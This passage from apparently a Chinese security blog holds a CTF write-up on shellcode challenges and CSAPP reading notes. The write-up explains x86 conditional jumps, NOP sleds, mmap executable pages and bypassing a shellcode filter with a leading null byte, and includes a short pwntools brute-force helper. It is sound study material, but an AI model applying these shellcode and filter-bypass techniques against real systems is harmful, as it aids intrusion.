read（0，buf，0x400）<br>🌈框 判读读入var长度，如果&gt;0条跳转至loc_11AC,&lt;&#x3D;跳转至locret_1254</p><p><strong>loc_11AC</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807142146306.png" alt="image-20230807142146306"></p><p>将rbp+var_4的位置置为0，然后跳转置loc_123A</p><p><strong>loc_123A</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807142343645.png" alt="image-20230807142343645"></p><p>如果0&lt;输入参数长度，跳转至loc_11B8，失败则call字符串地址执行，即写入shellcode</p><p><strong>loc_11B8</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807143139655.png" alt="image-20230807143139655"><br>cdqe使用eax的最高位拓展rax高32位的所有位<br>movzx按照无符号类型传送+扩展（16-32）<br>eax是32位寄存器，ax是eax的低16位，ah是ax的高8位，而al是ax的低8位<br>上述大致意思是将我们输入字符串的每一位进行比较，如果不在0x60-0x7A范围内就跳转，loc_11DA和loc_1236就是范围（均是&lt;&#x3D;跳转）</p><hr><p><strong>补充</strong></p><p>汇编语言中条件转移语句：JL&#x2F;JNGE， 用于<a href="https://baike.baidu.com/item/%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B0/6597563?fromModule=lemma_inlink">有符号数</a>的<a href="https://baike.baidu.com/item/%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4/15283661?fromModule=lemma_inlink">条件转移指令</a>，小于\不大于且不等于转移；ZF&#x3D;0，且SF⊕OF&#x3D;1。</p><p><a href="https://baike.baidu.com/item/%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F/298210?fromModule=lemma_inlink">汇编程序</a>设计中jl是一个条件<a href="https://baike.baidu.com/item/%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4/56285320?fromModule=lemma_inlink">跳转指令</a>，全名jump less，意为小于跳转，数比较类似的还有还有jg、ja、jb等jg jump great 有符号数大于跳转，<a href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B0/6597435?fromModule=lemma_inlink">无符号数</a>比较ja above 大于，jb below 小于，无符号数比较条件跳转根据的是标志位，条件跳转语句前面一般都有一些对标志位有影响的语句，如cmp ，<a href="https://baike.baidu.com/item/test/10804276?fromModule=lemma_inlink">test</a> ，sub等</p><p>86 指令集包含大量的条件跳转指令。它们能比较有符号和无符号整数，并根据单个 CPU 标志位的值来执行操作。条件跳转指令可以分为四个类型：</p><ul><li>基于特定标志位的值跳转</li><li>基于两数是否相等，或是否等于（E）CX 的值跳转</li><li>基于无符号操作数的比较跳转</li><li>基于有符号操作数的比较跳转</li></ul><p>下表展示了基于零标志位、进位标志位、溢出标志位、奇偶标志位和符号标志位的跳转。</p><table><thead><tr><th>助记符</th><th>说明</th><th>标志位&#x2F;寄存器</th><th>助记符</th><th>说明</th><th>标志位&#x2F;寄存器</th></tr></thead><tbody><tr><td>JZ</td><td>为零跳转</td><td>ZF&#x3D;1</td><td>JNO</td><td>无溢出跳转</td><td>OF&#x3D;0</td></tr><tr><td>JNZ</td><td>非零跳转</td><td>ZF&#x3D;0</td><td>JS</td><td>有符号跳转</td><td>SF&#x3D;1</td></tr><tr><td>JC</td><td>进位跳转</td><td>CF&#x3D;1</td><td>JNS</td><td>无符号跳转</td><td>SF&#x3D;0</td></tr><tr><td>JNC</td><td>无进位跳转</td><td>CF&#x3D;0</td><td>JP</td><td>偶校验跳转</td><td>PF&#x3D;1</td></tr><tr><td>JO</td><td>溢出跳转</td><td>OF&#x3D;1</td><td>JNP</td><td>奇校验跳转</td><td>PF&#x3D;0</td></tr></tbody></table><h4 id="1-相等性的比较"><a href="#1-相等性的比较" class="headerlink" title="1) 相等性的比较"></a>1) 相等性的比较</h4><p>下表列出了基于相等性评估的跳转指令。有些情况下，进行比较的是两个操作数；其他情况下，则是基于 CX、ECX 或 RCX 的值进行跳转。表中符号 leftOp 和 rightOp 分别指的是 CMP 指令中的左（目的）操作数和右（源）操 作数：</p><table><thead><tr><th>助记符</th><th>说明</th></tr></thead><tbody><tr><td>JE</td><td>相等跳转 (leftOp&#x3D;rightOp)</td></tr><tr><td>JNE</td><td>不相等跳转 (leftOp M rightOp)</td></tr><tr><td>JCXZ</td><td>CX&#x3D;0 跳转</td></tr><tr><td>JECXZ</td><td>ECX&#x3D;0 跳转</td></tr><tr><td>JRCXZ</td><td>RCX&#x3D;0 跳转（64 位模式）</td></tr></tbody></table><p>CMP leftOp,rightOp</p><p>操作数名字反映了代数中关系运算符的操作数顺序。比如，表达式 X&lt; Y 中，X 被称为 leftOp，Y 被称为 rightOp。</p><p>尽管 JE 指令相当于 JZ（为零跳转），JNE 指令相当于 JNZ（非零跳转），但是，最好是选择最能表明编程意图的助记符（JE 或 JZ），以便说明是比较两个操作数还是检查特定的状态标志位。</p><p>下述示例使用了 JE、JNE、JCXZ 和 JECXZ 指令。仔细阅读注释，以保证理解为什么条件跳转得以实现（或不实现）。</p><p>示例 1：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0A523h</span></span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">edx</span>, <span class="number">0A523h</span></span><br><span class="line"><span class="keyword">jne</span> L5            <span class="comment">;不发生跳转</span></span><br><span class="line"><span class="keyword">je</span> L1             <span class="comment">;跳转</span></span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">1234h</span></span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">bx</span>,<span class="number">1234h</span></span><br><span class="line"><span class="keyword">jne</span> L5            <span class="comment">;不发生跳转</span></span><br><span class="line"><span class="keyword">je</span> L1             <span class="comment">;跳转</span></span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="keyword">ex</span>, 0FFFFh</span><br><span class="line">inc <span class="keyword">ex</span></span><br><span class="line">jexz L2           ;跳转</span><br></pre></td></tr></table></figure><p>示例4：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor </span>ecx,ecx</span><br><span class="line"><span class="keyword">jeexz </span>L2          <span class="comment">;跳转</span></span><br></pre></td></tr></table></figure><h4 id="2-无符号数比较"><a href="#2-无符号数比较" class="headerlink" title="2) 无符号数比较"></a>2) 无符号数比较</h4><p>基于无符号数比较的跳转如下表所示。操作数的名称反映了表达式中操作数的顺序（比如 leftOp &lt; rightOp）。下表中的跳转仅在比较无符号数值时才有意义。有符号操作数使用不同的跳转指令。</p><table><thead><tr><th>助记符</th><th>说明</th><th>助记符</th><th>说明</th></tr></thead><tbody><tr><td>JA</td><td>大于跳转（若 leftOp &gt; rightOp）</td><td>JB</td><td>小于跳转（若 leftOp &lt; rightOp）</td></tr><tr><td>JNBE</td><td>不小于或等于跳转（与 JA 相同）</td><td>JNAE</td><td>不大于或等于跳转（与 JB 相同）</td></tr><tr><td>JAE</td><td>大于或等于跳转（若 leftOp ≥ rightOp）</td><td>JBE</td><td>小于或等于跳转（若 leftOp ≤ rightOp）</td></tr><tr><td>JNB</td><td>不小于跳转（与 JAE 相同）</td><td>JNA</td><td>不大于跳转（与 JBE 相同）</td></tr></tbody></table><h4 id="3-有符号数比较"><a href="#3-有符号数比较" class="headerlink" title="3) 有符号数比较"></a>3) 有符号数比较</h4><p>下表列岀了基于有符号数比较的跳转。下面的指令序列展示了两个有符号数值的比较：</p><table><thead><tr><th>助记符</th><th>说明</th><th>助记符</th><th>说明</th></tr></thead><tbody><tr><td>JG</td><td>大于跳转（若 leftOp &gt; rightOp）</td><td>JL</td><td>小于跳转（若 leftOp &lt; rightOp）</td></tr><tr><td>JNLE</td><td>不小于或等于跳转（与 JG 相同）</td><td>JNGE</td><td>不大于或等于跳转（与 JL 相同）</td></tr><tr><td>JGE</td><td>大于或等于跳转（若 leftOp ≥ rightOp）</td><td>JLE</td><td>小于或等于跳转（若 leftOp ≤ rightOp）</td></tr><tr><td>JNL</td><td>不小于跳转（与 JGE 相同）</td><td>JNG</td><td>不大于跳转（与 JLE 相同）</td></tr></tbody></table><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> al, +<span class="number">127</span>       ;十六进制数值 <span class="number">7</span>Fh</span><br><span class="line"><span class="attribute">cmp</span> al, -<span class="number">128</span>       ;十六进制数值 <span class="number">80</span>h</span><br><span class="line"><span class="attribute">ja</span> Is Above        ;不跳转，因为 <span class="number">7</span>Fh &lt; <span class="number">80</span>h</span><br><span class="line"><span class="attribute">jg</span> IsGreater        ;跳转，因为 +<span class="number">127</span> &gt; -<span class="number">128</span></span><br></pre></td></tr></table></figure><p>由于无符号数 7Fh 小于无符号数 80h，因此，为无符号数比较而设计的 JA 指令不发生跳转。另一方面，由于 +127 大于 -128，因此，为有符号数比较而设计的 JG 指令发生跳转。</p><p>对下面的代码示例，阅读注释，以保证理解为什么跳转得以实现（或不实现）：</p><p>示例 1：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> edx,-<span class="number">1</span></span><br><span class="line"><span class="attribute">cmp</span> edx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jnl</span> L5          ;不发生跳转（-<span class="number">1</span> ≥ <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jnle</span> L5         ;不发生跳转（-<span class="number">1</span> &gt; <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jl</span> L1           ;跳转（-<span class="number">1</span> &lt; <span class="number">0</span> 为真）</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> bx,+ <span class="number">32</span></span><br><span class="line"><span class="attribute">cmp</span> bx,-<span class="number">35</span></span><br><span class="line"><span class="attribute">jng</span> L5         ;不发生跳转（ + <span class="number">32</span> ≤ -<span class="number">35</span> 为假）</span><br><span class="line"><span class="attribute">jnge</span> L5        ;不发生跳转（ + <span class="number">32</span> &lt; -<span class="number">35</span> 为假）</span><br><span class="line"><span class="attribute">jge</span> L1         ;跳转（ + <span class="number">32</span> ≥ -<span class="number">35</span> 为真）</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">cmp</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jg</span> L5           ;不发生跳转（<span class="number">0</span> &gt; <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jnl</span> L1          ;跳转（<span class="number">0</span> ≥ <span class="number">0</span> 为真）</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">cmp</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jl</span> L5           ;不发生跳转（<span class="number">0</span> &lt; <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jng</span> L1          ;跳转（<span class="number">0</span> ≤ <span class="number">0</span> 为真）</span><br></pre></td></tr></table></figure><p><strong>我说又是新盲区（樂）</strong></p><p>NX开 部分RELRO</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811115741786.png" alt="image-20230811115741786"></p><p>buf溢出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>addr</code>：指定映射的起始地址，0LL 表示让系统选择适当的地址。</li><li><code>length</code>：指定映射区域的长度，4096uLL 表示映射区域的大小为 4096 字节。</li><li><code>prot</code>：指定映射区域的保护方式，7 表示可读、可写和可执行。</li><li><code>flags</code>：指定映射区域的标志，34 表示映射为私有（不与其他进程共享）且延迟分配物理内存。</li><li><code>fd</code>：指定要映射的文件描述符，0 表示没有关联的文件，仅映射匿名内存区域。</li><li><code>offset</code>：指定文件映射的偏移量，0LL 表示从文件的起始位置开始映射。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811115837511.png" alt="image-20230811115837511"></p><p>check（） 对传入shellcode 进行逐字符检查  检查到*i &#x3D;&#x3D; 0是退出 可以使用\x00绕过<br>跟进unk_400F20发现有足够空间写入shellcode（不顺利可能还需绕过以及shellcode长度限制）</p><p>\x00B后面加上一个字符， 对应一个汇编语句.所以我们可以通过\x00B\x22、\x00B\x00 、\x00J\x00等等来绕过此检查.</p><p>另一种常见绕过思路，我们绕过\x00即可.那怎么绕过呢？<br>脚本小子！(找汇编中的’\x00’)<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">            payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">            res = disasm(payload)</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                res != <span class="string">&quot; ...&quot;</span></span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>, res)</span><br><span class="line">                <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res</span><br><span class="line">                ):</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p><strong>nop sled</strong><br>一种可以破解栈随机化的缓冲区溢出攻击方式。 </p><p>在实际的攻击代码前注入很长的 nop 指令 （无操作，仅使程 序计数器加一）序列， 只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址， 并执行。</p><p> 由于栈地址在一定范围的随机性，攻击者不能够知道攻击代码注入的地址，而要执行攻击代码需要 将函数的返回地址更改为攻击代码的地址（可通过缓冲区溢出的方式改写函数返回地址）。所以，只能在一定范围内（栈随机导致攻击代码地址一定范围内随机）枚举攻击代码位置（有依据的猜）</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不用 <span class="function"><span class="title">nop</span> sled ， 函数返回地址 -------&gt;</span> 攻击代码。</span><br><span class="line">使用 <span class="function"><span class="title">nop</span> sled ， 函数返回地址 -------&gt;</span> nop 序列（顺序执行） 直到攻击代码地址</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811142321120.png" alt="image-20230811142321120"></p><p>本地缓冲区大小位0x1000</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811143658329.png" alt="image-20230811143658329"></p><p>v2 &#x3D; rand() % 1337 - 668; ：这行代码使用 rand 函数生成一个随机数，并通过取模运算将其 限制在范围 0 到 1336 之间。然后，从结果中减去 668，得到一个范围在 -668 到 668 之间的随机整 数，并将其存储在变量 v2 中</p><table><thead><tr><th>较低地址</th><th>&#x3D;&gt;</th><th>&#x3D;&gt;</th><th>&#x3D;&gt;</th><th></th></tr></thead><tbody><tr><td>stk[ebp-0x15]</td><td>ebp&#x3D;&gt;(旧ebp)</td><td>return addr</td><td>padding[0x10]</td><td>buffer[0x1000]</td></tr></tbody></table><h3 id="mmap（）函数主要三个用途"><a href="#mmap（）函数主要三个用途" class="headerlink" title="mmap（）函数主要三个用途"></a>mmap（）函数主要三个用途</h3><p>1.将一个普通文件映射到内存中。通常需要对文件进行频繁读写时使用，使得内存读写取代I&#x2F;O读写，获得较高性能。<br>2.将特殊文件进行匿名内存映射，为关联进程提供共享内存空间<br>3.为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seccomp提示沙盒检查 </span><br><span class="line">seccomp-tools dump ./elf<span class="symbol">&#x27;s</span> name</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP阅读碎片</title>
      <link href="/2022/11/04/CSAPP%E9%98%85%E8%AF%BB%E7%A2%8E%E7%89%87/"/>
      <url>/2022/11/04/CSAPP%E9%98%85%E8%AF%BB%E7%A2%8E%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="CSAPP阅读碎片"><a href="#CSAPP阅读碎片" class="headerlink" title="CSAPP阅读碎片"></a>CSAPP阅读碎片</h2><p>预处理 编译 汇编（二进制文件 目标文件） 链接<br>shell – 命令解释器（默认设置）<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20230915193018922.png" alt="image-20230915193018922"></p><h3 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h3><p><strong>1.总线</strong> – 各个部件中传递且携带信息字节的传送定长字节块[4&#x2F;8]（字 word）<br><strong>2.I&#x2F;O设备</strong>  主板（I&#x2F;O设备本身或系统的主印<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231112153110859.png" alt="image-20231112153110859">电路板上的芯片组）– 在I&#x2F;O总线和I&#x2F;O设备间传递消息<br>【一个典型系统的硬件组成】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230830195055368.png" alt="image-20230830195055368"></p><p><strong>3.主存</strong> –临时存放程序和程序处理数据的一组动态随机存取存储器（DRAM）芯片. 逻辑上存储器是每字节有唯一数组索引的线性字节数组<br><strong>4.处理器（读取并解释存放在主存里的二进制指令）（</strong>中央处理单元【CPU】）–解释（或执行）存储在主存中指令的引擎中央处理单元 处理器的核心是大小为一字节的存储设备–程序计数器PC 任何时刻PC都指向主存中的含指令地址的某条机器语言指令 </p><p><strong>处理器的指令集–描述每条机器代码指令的效果</strong><br><strong>处理器的微体系结构–处理器实际是怎么实现的</strong></p><p>程序经汇编后的机器指令最初存放在磁盘上，程序加载时被复制到主存，处理器运行程序时，指令从主存复制到处理器</p><p>高速缓存存储器（cache memory）：作为暂时集结的区域，存放处理器近期可能会需要的信息.<br>高速缓存的局部性原理：程序具有访问局部区域里的数据和代码的趋势，通过让告诉缓存里存放可能经常访问的数据，大部分的内存操作都能在快速的高速缓存中完成.</p><h3 id="静态随机访问存储器（SRAM）：L1、L2高速缓存依赖"><a href="#静态随机访问存储器（SRAM）：L1、L2高速缓存依赖" class="headerlink" title="静态随机访问存储器（SRAM）：L1、L2高速缓存依赖"></a>静态随机访问存储器（SRAM）：L1、L2高速缓存依赖</h3><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230831223813540.png" alt="image-20230831223813540"></p><h3 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h3><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230831231036426.png" alt="image-20230831231036426"></p><h3 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h3><p>shell加载和运行程序都依靠操作系统并未直接访问硬件.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901100821015.png" alt="image-20230901100821015"></p><h4 id="操作系统两个基本功能（通过进程、虚拟内存、文件实现）："><a href="#操作系统两个基本功能（通过进程、虚拟内存、文件实现）：" class="headerlink" title="操作系统两个基本功能（通过进程、虚拟内存、文件实现）："></a><strong>操作系统两个基本功能</strong>（通过进程、虚拟内存、文件实现）：</h4><p>1.防止硬件被失控的应用程序滥用<br>2.向应用程序提供简单一致的机制来控制复杂又通常大不相同的低级硬件设备.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901102402944.png" alt="image-20230901102402944"></p><p>进程:操作系统对正在进行的程序的一种抽象，即在一个系统上可以同时运行多个进程而每个进程好像都在独立地使用硬件.</p><p><strong>并发运行</strong>：一个进程的指令和和另一个进程的指令是交错执行的.</p><p><strong>上下文</strong>：操作系统保持跟踪进程运行所需的所有状态信息的状态.上下文切换发生在操作系统决定把控制权由当前转移到某个新进程时.<br>流程：保存当前上下文–恢复新进程的上下文–控制权由旧到新</p><p>从一个进程到另一个进程的转换由操作系统内核管理<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901103917224.png" alt="image-20230901103917224"></p><p>（某些操作–系统调用–控制权传给内核–执行被请求操作–返回应用程序）内核时操作系统代码常驻主存的部分，它不是一个独立的进程，它是系统管理全部进程所用代码和数据结构的集合.</p><p><strong>线程</strong>：进程的执行单元.即一个进行由多个线程的执行单元组成.<br>线程一般比进程更高效：每个线程在进程的上下文中且共享相同的代码和全局数据；多线程比多进程之间更容易共享数据</p><p><strong>虚拟内存</strong>：为进程提供的假象–每个进程都在独立地使用主存.每个进程看到一致的内存–虚拟地址空间.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901105945968.png" alt="image-20230901105945968"></p><p>地址空间最上面的区域是保留给操作系统中的代码和数据的，这对所有进程来说都是一样。地址空间的底部区域</p><p><strong>系统之间利用网络通信</strong>：当系统从主存复制一串字节到网络适配器时，数据流经过网络到达另一台机器，而不是比如说到达本地磁盘驱动器。相似地，系统可以读取从其他机器发送来的数据，并把数据复制到自己的主存。<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901111304108.png" alt="image-20230901111304108"></p><p><strong>Amdahl定律</strong><br>主要思想：对系统某部分加速时，其对系统整体的影响性能取决于该部分的重要性和加速程度.</p><p>即想显著加速整个系统必须提升全系统中相当大的部分的速度.<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20230903102649463.png" alt="image-20230903102649463"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>1.计算机系统是由硬件和软件组成的，它们共同协作以运行应用程序.<br>2.程序被其他程序翻译成不同的形式，先ASCII文本后被编译器和链接器翻译成二进制可执行文件.<br>3.计算机花费了大量的时间在内存、I&#x2F;O设备和CPU寄存器之间复制数据，因此系统被划分成层次结构（上面的附图ww）顶：CPU 下一层：多层的硬件高速缓存存储器、DRAM主存和<br>4.操作系统内核是应用程序和硬件之间的媒介.提供三个基本的抽象：<br>（1）文件是对I&#x2F;O设备的抽象<br>（2）虚拟内存是对主存和磁盘的抽象<br>（3）进程是处理器、主存和I&#x2F;O设备的抽象<br>5.网络提供了计算机系统之间的通信手段，特殊角度来看网络就是一种I&#x2F;O设备</p><h3 id="在系统上运行程序"><a href="#在系统上运行程序" class="headerlink" title="在系统上运行程序"></a>在系统上运行程序</h3><p>链接器把程序的各个部分联合成一个文件，将其加载到内存并执行。<br>链接可在编译时执行（源码被翻译成机器码），加载时（加载器架加载到内存并执行），运行时（程序执行）执行。<br>链接由链接器（程序）自动执行。</p><p>链接器是的<strong>分离编译</strong>成为可能（更小模块化进行处理，感觉像某语言特点hh）<br>无论什么样的操作系统、ISA或目标文件格式，基本的链接概念是通用的。</p><p>main.i——&gt;main.s(ASCII)【编译器（ccl）】<br>main.s——&gt;main.o(可重定位文件)【汇编器（as】<br>mian.o——&gt;a.out（可执行文件）【链接器(ld)】</p><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>如linux ld 程序这杨样静态链接器以一组可重定位目标文件和命令行参数作为输入，生成一个完全链接的、可加载和运行的可执行目标文件输出.</p><p><strong>链接器构造可执行文件的步骤</strong></p><p>符号解析（symbol resolution）。<strong>目标文件定义和引用符号，每个符号对应于一个函数、一个全局变量或一个</strong>静态变量**（即 C 语言中任何以 static 属性声明的变量）。符号解析的目的是将每个符号引用正好和一个符号定义关联起来。</p><p><strong>重定位（relocation）。</strong>编译器和汇编器生成从地址 0 开始的代码和数据节。链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，使得它们指向这个内存位置。链接器使用汇编器产生的<strong>重定位条目</strong>（relocation entry）的详细指令，不加甄别地执行这样的重定位。</p><h3 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h3><p>三种类型</p><h4 id="可重定位目标文件"><a href="#可重定位目标文件" class="headerlink" title="可重定位目标文件"></a>可重定位目标文件</h4><p>包含二进制代码和数据 形式可以在编译时与其他可重定位目标文件合并 创建一个可执行文件<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231129191018891.png" alt="image-20231129191018891"></p><p>ELF头剩下的部分包含帮助链接器语法分析和解释目标文件的信息。<br>包括：<br>ELF头的大小<br>目标文件类型（如科重定位、可执行或可共享的）<br>机器类型（如x86-64）<br>字头部表的文件偏移<br>节头部表中条目的大小和数量</p><p>不同节的位置和大小都是由节头部表描述的，其中目标文件中的每一个节都有一个固定大小的条目。      </p><h4 id="可执行目标文件"><a href="#可执行目标文件" class="headerlink" title="可执行目标文件"></a>可执行目标文件</h4><p>包含二进制代码和数据 信号是可直接被复制到内存</p><h4 id="共享目标文件"><a href="#共享目标文件" class="headerlink" title="共享目标文件"></a>共享目标文件</h4><p>一种特殊类型的可重定位目标文件 可以在加载或运行时被动态地加载进内存并链接.</p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
